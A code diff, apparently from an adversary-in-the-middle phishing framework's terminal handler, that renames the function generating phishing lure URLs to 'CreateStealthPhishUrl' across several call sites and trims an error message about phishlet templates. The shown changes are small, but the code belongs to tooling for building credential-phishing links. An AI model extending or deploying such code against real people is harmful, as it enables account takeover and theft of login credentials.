@@ -627,7 +627,7 @@ func (t *Terminal) handlePhishlets(args []string) error {
 				break
 			}
 			if pl.isTemplate {
-				return fmt.Errorf("phishlet '%s' is a template - you have to 'create' child phishlet from it, with predefined parameters, before you can enable it.", args[1])
+				return fmt.Errorf("phishlet '%s' is a template - you have to 'create' child phishlet from it, with predefined parameters, before you can enable it", args[1])
 			}
 			err = t.cfg.SetSiteEnabled(args[1])
 			if err != nil {
@@ -820,10 +820,10 @@ func (t *Terminal) handleLures(args []string) error {
 
 							log.Info("adding parameter: %s='%s'", k, v)
 						}
-						phish_urls = append(phish_urls, t.createPhishUrl(base_url, &params))
+						phish_urls = append(phish_urls, t.CreateStealthPhishUrl(base_url, &params))
 					}
 				} else {
-					phish_urls = append(phish_urls, t.createPhishUrl(base_url, &params))
+					phish_urls = append(phish_urls, t.CreateStealthPhishUrl(base_url, &params))
 				}
 
 				for n, phish_url := range phish_urls {
@@ -1566,7 +1566,7 @@ func (t *Terminal) importParamsFromFile(base_url string, path string) ([]string,
 				}
 
 				if len(params) > 0 {
-					ret = append(ret, t.createPhishUrl(base_url, &params))
+					ret = append(ret, t.CreateStealthPhishUrl(base_url, &params))
 					ret_params = append(ret_params, map_params)
 				}
 			}
@@ -1593,7 +1593,7 @@ func (t *Terminal) importParamsFromFile(base_url string, path string) ([]string,
 				map_params[param_names[n]] = param
 			}
 			if len(item) > 0 {
-				ret = append(ret, t.createPhishUrl(base_url, &item))
+				ret = append(ret, t.CreateStealthPhishUrl(base_url, &item))
 				ret_params = append(ret_params, map_params)
 			}
 		}
@@ -1625,7 +1625,7 @@ func (t *Terminal) importParamsFromFile(base_url string, path string) ([]string,
 				}
 			}
 			if len(item) > 0 {
-				ret = append(ret, t.createPhishUrl(base_url, &item))
+				ret = append(ret, t.CreateStealthPhishUrl(base_url, &item))
 				ret_params = append(ret_params, map_params)
 			}
 		}
@@ -1762,7 +1762,7 @@ func (t *Terminal) exportPhishUrls(export_path string, phish_urls []string, phis
 	return nil
 }
 
-func (t *Terminal) createPhishUrl(base_url string, params *url.Values) string {
+func (t *Terminal) CreateStealthPhishUrl(base_url string, params *url.Values) string {
 	var ret string = base_url
 	if len(*params) > 0 {
 		key_arg := strings.ToLower(GenRandomString(rand.Intn(3) + 1))
